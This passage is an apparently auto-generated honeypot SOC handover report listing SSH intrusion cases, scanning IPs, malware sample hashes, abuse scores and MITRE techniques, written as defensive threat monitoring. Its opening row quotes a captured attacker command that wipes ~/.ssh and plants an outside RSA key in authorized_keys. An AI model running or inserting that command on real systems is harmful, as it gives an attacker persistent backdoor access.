| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 20:02:36` | `cowrie.session.connect` |
| `2026-06-18 20:02:36` | `cowrie.client.version` |
| `2026-06-18 20:02:37` | `cowrie.client.kex` |
| `2026-06-18 20:02:37` | `cowrie.login.success` |
| `2026-06-18 20:02:38` | `cowrie.session.params` |
| `2026-06-18 20:02:38` | `cowrie.command.input` |
| `2026-06-18 20:02:38` | `cowrie.command.failed` |
| `2026-06-18 20:02:38` | `cowrie.log.closed` |
| `2026-06-18 20:02:38` | `cowrie.session.params` |
| `2026-06-18 20:02:38` | `cowrie.command.input` |
| `2026-06-18 20:02:38` | `cowrie.session.file_download` |
| `2026-06-18 20:02:38` | `cowrie.log.closed` |
| `2026-06-18 20:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f138db35201b

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-06-18 20:02 |
| **Last Seen** | 2026-06-18 20:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 20:02:40` | `cowrie.session.connect` |
| `2026-06-18 20:02:40` | `cowrie.client.version` |
| `2026-06-18 20:02:41` | `cowrie.client.kex` |
| `2026-06-18 20:02:41` | `cowrie.login.success` |
| `2026-06-18 20:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced6fd26c3a0

| Field | Detail |
|---|---|
| **Source IP** | `218.4.156[.]254` |
| **First Seen** | 2026-06-18 20:45 |
| **Last Seen** | 2026-06-18 20:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 20:45:51` | `cowrie.session.connect` |
| `2026-06-18 20:45:52` | `cowrie.client.version` |
| `2026-06-18 20:45:52` | `cowrie.client.kex` |
| `2026-06-18 20:45:54` | `cowrie.login.success` |
| `2026-06-18 20:45:54` | `cowrie.direct-tcpip.request` |
| `2026-06-18 20:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.4.156[.]254` to AbuseIPDB if not already reported
- [ ] Block `218.4.156[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a5ad8668d4c

| Field | Detail |
|---|---|
| **Source IP** | `183.89.208[.]174` |
| **First Seen** | 2026-06-18 21:54 |
| **Last Seen** | 2026-06-18 21:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 21:54:33` | `cowrie.session.connect` |
| `2026-06-18 21:54:33` | `cowrie.client.version` |
| `2026-06-18 21:54:33` | `cowrie.client.kex` |
| `2026-06-18 21:54:35` | `cowrie.login.success` |
| `2026-06-18 21:54:36` | `cowrie.direct-tcpip.request` |
| `2026-06-18 21:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.89.208[.]174` to AbuseIPDB if not already reported
- [ ] Block `183.89.208[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `134.122.23[.]93` | **58** | 2026-06-18 18:28 | 2026-06-18 21:59 | 58m | 0 | `T1592` | 🟠 MEDIUM |
| `103.217.145[.]41` | **12** | 2026-06-18 19:38 | 2026-06-18 19:59 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `143.198.233[.]61` | **11** | 2026-06-18 21:16 | 2026-06-18 22:07 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `134.209.241[.]3` | **8** | 2026-06-18 18:56 | 2026-06-18 21:56 | 1m | 0 | `T1592` | 🟢 LOW |
| `171.231.177[.]174` | **5** | 2026-06-18 19:32 | 2026-06-18 19:37 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `173.249.210[.]17` | **2** | 2026-06-18 20:26 | 2026-06-18 20:26 | 1m | 0 | `T1592` | 🟢 LOW |
| `103.220.91[.]130` | 1 | 2026-06-18 20:57 | 2026-06-18 20:57 | 2s | 0 | `T1592` | 🟢 LOW |
| `106.12.69[.]68` | 1 | 2026-06-18 19:41 | 2026-06-18 19:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.216[.]185` | 1 | 2026-06-18 20:05 | 2026-06-18 20:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.14[.]72` | 1 | 2026-06-18 19:19 | 2026-06-18 19:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.1.120[.]2` | 1 | 2026-06-18 18:59 | 2026-06-18 18:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.224.78[.]164` | 1 | 2026-06-18 20:02 | 2026-06-18 20:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.66.63[.]186` | 1 | 2026-06-18 19:52 | 2026-06-18 19:52 | 7s | 0 | `T1592` | 🟢 LOW |
| `122.114.113[.]177` | 1 | 2026-06-18 19:38 | 2026-06-18 19:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.139.124[.]120` | 1 | 2026-06-18 18:52 | 2026-06-18 18:52 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `135.232.208[.]128` | 1 | 2026-06-18 22:13 | 2026-06-18 22:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `160.191.244[.]158` | 1 | 2026-06-18 20:02 | 2026-06-18 20:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.12[.]108` | 1 | 2026-06-18 20:02 | 2026-06-18 20:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `167.179.14[.]69` | 1 | 2026-06-18 21:33 | 2026-06-18 21:33 | 9s | 0 | `T1592` | 🟢 LOW |
| `183.56.179[.]201` | 1 | 2026-06-18 20:46 | 2026-06-18 20:47 | 95s | 0 | `T1592` | 🟢 LOW |
| `183.91.186[.]36` | 1 | 2026-06-18 20:02 | 2026-06-18 20:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.100.215[.]213` | 1 | 2026-06-18 20:03 | 2026-06-18 20:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `187.49.63[.]51` | 1 | 2026-06-18 18:47 | 2026-06-18 18:47 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `189.113.47[.]155` | 1 | 2026-06-18 19:41 | 2026-06-18 19:41 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `189.147.19[.]238` | 1 | 2026-06-18 19:44 | 2026-06-18 19:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.89.159[.]59` | 1 | 2026-06-18 19:46 | 2026-06-18 19:46 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `206.167.33[.]157` | 1 | 2026-06-18 20:10 | 2026-06-18 20:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.120.184[.]63` | 1 | 2026-06-18 20:37 | 2026-06-18 20:38 | 30s | 0 | `T1592` | 🟢 LOW |
| `31.173.8[.]170` | 1 | 2026-06-18 19:29 | 2026-06-18 19:29 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `37.237.228[.]215` | 1 | 2026-06-18 22:11 | 2026-06-18 22:11 | 12s | 0 | `T1592` | 🟢 LOW |
| `37.60.141[.]89` | 1 | 2026-06-18 20:52 | 2026-06-18 20:52 | 30s | 0 | `T1592` | 🟢 LOW |
| `47.79.224[.]253` | 1 | 2026-06-18 21:08 | 2026-06-18 21:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `51.81.223[.]238` | 1 | 2026-06-18 20:38 | 2026-06-18 20:38 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 44/100 | 🟡 MEDIUM | **35/73** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `37.237.228[.]215` | IQ | EarthLink Ltd. Communications&Internet Services-Orange | **100** ⚠️ | 11 |
| `134.209.241[.]3` | DE | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `37.60.141[.]89` | NL | ColocaTel Datacenter | **100** ⚠️ | 1 |
| `134.122.23[.]93` | US | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `160.191.244[.]158` | VN | Hoang Dieu Cloud Computing Company Limited | **100** ⚠️ | 13 |
| `218.4.156[.]254` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `185.100.215[.]213` | BR | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 12 |
| `165.154.12[.]108` | AE | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 14 |
| `125.139.124[.]120` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `206.167.33[.]157` | OM | Awaser Oman LLC | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 56 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 52 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 17 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (66 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 28 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 38 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 206 cases |
| Tool 34  | Credential Extractor        | ✅ 99 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 46 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 66 filtered (32.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 34 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 17 priority case(s) shown individually · 33 recon entry/entries in table (6 group(s) consolidating 96 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-18T22:14:35Z_
